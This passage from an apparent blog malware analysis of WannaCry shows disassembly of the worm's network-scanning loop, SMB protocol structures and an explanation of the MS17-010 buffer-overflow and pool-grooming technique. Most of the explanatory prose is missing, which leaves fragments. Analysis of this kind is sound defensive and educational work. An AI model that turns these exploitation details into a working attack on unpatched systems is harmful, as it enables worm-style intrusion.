service_entry+65j</span><br><span class="line">.text:00407C0D                 push    0</span><br><span class="line">.text:00407C0F                 push    0</span><br><span class="line">.text:00407C11                 push    esi</span><br><span class="line">.text:00407C12                 push    offset scan_wan</span><br><span class="line">.text:00407C17                 push    0</span><br><span class="line">.text:00407C19                 push    0</span><br><span class="line">.text:00407C1B                 call    edi ; _beginthreadex ; </span><br><span class="line">.text:00407C1D                 add     esp, 18h</span><br><span class="line">.text:00407C20                 test    eax, eax</span><br><span class="line">.text:00407C22                 jz      short loc_407C27</span><br><span class="line">.text:00407C24                 push    eax             ; hObject</span><br><span class="line">.text:00407C25                 call    ebp ; CloseHandle</span><br><span class="line">.text:00407C27</span><br><span class="line">.text:00407C27 loc_407C27:                             ; CODE XREF: service_entry+52j</span><br><span class="line">.text:00407C27                 push    7D0h            ; dwMilliseconds</span><br><span class="line">.text:00407C2C                 call    ebx ; Sleep</span><br><span class="line">.text:00407C2E                 inc     esi</span><br><span class="line">.text:00407C2F                 cmp     esi, 80h ; &#x27;&#x27;</span><br><span class="line">.text:00407C35                 jl      short loc_407C0D</span><br><span class="line">.text:00407C37                 pop     edi</span><br><span class="line">.text:00407C38                 pop     esi</span><br><span class="line">.text:00407C39                 pop     ebp</span><br><span class="line">.text:00407C3A                 xor     eax, eax</span><br><span class="line">.text:00407C3C                 pop     ebx</span><br><span class="line">.text:00407C3D                 retn</span><br><span class="line">.text:00407C3D service_entry   endp</span><br></pre></td></tr></table></figure><p>&emsp;payload<code>init_payload</code>SMB<code>scan_lan</code>445SMBSMB</p><h2 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h2><p>&emsp;3SMB<code>SMB_COM_TRANSACTION2(0x32)</code>SMB</p><p>1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SMB_Header&#123;</span><br><span class="line">    UCHAR Protocol[4];</span><br><span class="line">    UCHAR Command;</span><br><span class="line">    SMB_ERROR Status;</span><br><span class="line">    UCHAR  Flags;</span><br><span class="line">    USHORT Flags2;</span><br><span class="line">    USHORT PIDHigh;</span><br><span class="line">    UCHAR  SecurityFeatures[8];</span><br><span class="line">    USHORT Reserved;</span><br><span class="line">    USHORT TID;</span><br><span class="line">    USHORT PIDLow;</span><br><span class="line">    USHORT UID;</span><br><span class="line">    USHORT MID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SMB_Parameters&#123;</span><br><span class="line">    UCHAR  WordCount;</span><br><span class="line">    USHORT Words[WordCount] (variable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SMB_Data&#123;</span><br><span class="line">    USHORT ByteCount;</span><br><span class="line">    UCHAR  Bytes[ByteCount] (variable);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>4<code>SMB_COM_TRANSACTION2(0x32)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SMB_Parameters&#123;</span><br><span class="line">    UCHAR  WordCount;</span><br><span class="line">    Words&#123;</span><br><span class="line">        USHORT TotalParameterCount;</span><br><span class="line">        USHORT TotalDataCount;</span><br><span class="line">        USHORT MaxParameterCount;</span><br><span class="line">        USHORT MaxDataCount;</span><br><span class="line">        UCHAR  MaxSetupCount;</span><br><span class="line">        UCHAR  Reserved1;</span><br><span class="line">        USHORT Flags;</span><br><span class="line">        ULONG  Timeout;</span><br><span class="line">        USHORT Reserved2;</span><br><span class="line">        USHORT ParameterCount;</span><br><span class="line">        USHORT ParameterOffset;</span><br><span class="line">        USHORT DataCount;</span><br><span class="line">        USHORT DataOffset;</span><br><span class="line">        UCHAR  SetupCount;</span><br><span class="line">        UCHAR  Reserved3;</span><br><span class="line">        USHORT Setup[SetupCount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">SMB_Data&#123;</span><br><span class="line">    USHORT ByteCount;&#123;</span><br><span class="line">        UCHAR Name;</span><br><span class="line">        UCHAR Pad1[];</span><br><span class="line">        UCHAR Trans2_Parameters[ParameterCount];</span><br><span class="line">        UCHAR Pad2[];</span><br><span class="line">        UCHAR Trans2_Data[DataCount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5<code>SMB_COM_TRANSACTION2(0x32)</code>FEALIST</p><p><img src="/images/wannaCry-analysis/image-20230825110532842.png" alt="image-20230825110532842" style="zoom:67%;" /></p><h3 id="1-srv-sysSrvOs2FeaListToNt"><a href="#1-srv-sysSrvOs2FeaListToNt" class="headerlink" title="1  srv.sysSrvOs2FeaListToNt"></a>1  srv.sysSrvOs2FeaListToNt</h3><p><img src="/images/wannaCry-analysis/image-20230825110729702.png" alt="image-20230825110729702" style="zoom:67%;" /></p><p>&emsp;FEALISTNTFEALISTSrvOs2FeaListSizeToNtFEALISTcbList42sizeSrcOs2FeaToNt</p><p>&emsp;<code>srvnet.sys</code><code>srvnet</code><code>srvnet_recv</code>smb<code>MDL</code>shellcodeMDLtcpsmb</p><h3 id="2-SMB-COM-TRANSACTION2-0x32-"><a href="#2-SMB-COM-TRANSACTION2-0x32-" class="headerlink" title="2 SMB_COM_TRANSACTION2(0x32)"></a>2 SMB_COM_TRANSACTION2(0x32)</h3><p>&emsp;FEA LIST10000FEA LIST<code>SMB_COM_TRANSACTION2</code><code>TotalDataCount</code><code>USHORT</code><code>0xffff</code><code>0xffff</code></p><p>&emsp;<code>SMB_COM_TRANSACTION_SECONDARY(0x26)</code><code>SMB_COM_TRANSACTION2</code><code>SMB_COM_NT_TRANSACT</code><code>SMB_COM_NT_TRANSACT</code><code>TotalDataCount</code><code>ULONG</code><code>0xFFFF</code></p><p>&emsp;<code>SMB_COM_NT_TRANSACT</code>FEALIST<code>SMB_COM_TRANSACTION_SECONDARY(0x26)</code></p><p>&emsp;SMBTRANSACTION</p><p>1SMB_COM_TRANSACTION</p><p>2SMB_COM_TRANSACTION2</p><p>3SMB_COM_NT_TRANSACTEASD</p><p>&emsp;SMB_COM_TRANSACTION2TRANSACTIONSMBSecondSecond</p><p>&emsp;SMBTIPPIDUIDMIDSecondtranstionSecondtranstionSecondSMB_COM_TRANSACTION2_SECONDARYSMB_COM_TRANSACTION2transactionSecond<strong>SecondTIPPIDUIDMIDtransactionSecond</strong></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>&emsp;srvnet<code>SMB_COM_SESSION_SETUP_ANDX(0x73)</code><code>BlockingSessionSetupAndX</code><code>SMB_COM_SESSION_SETUP_ANDX(0x73)</code>wordcount12<code>SMB_Parameters</code>Capabilities<code>CAP_EXTENDED_SECURITY</code><code>FLAGS2_EXTENDED_SECURITY</code>1213<code>ByteCount</code><code>ByteCount</code><code>GetNtSecurityParameters</code><code>SrvAllocateNonPagedPool</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;wannacry&quot;&gt;&lt;a href=&quot;#wannacry&quot; class=&quot;headerlink&quot; title=&quot;wannacry&quot;&gt;&lt;/a&gt;wannacry&lt;/h1&gt;&lt;p&gt;&amp;emsp;wannacry&lt;/p&gt;</summary>
    
    
    
    <category term="virus-re" scheme="https://wd-2711.tech/categories/virus-re/"/>
    
    
  </entry>
  
</feed>
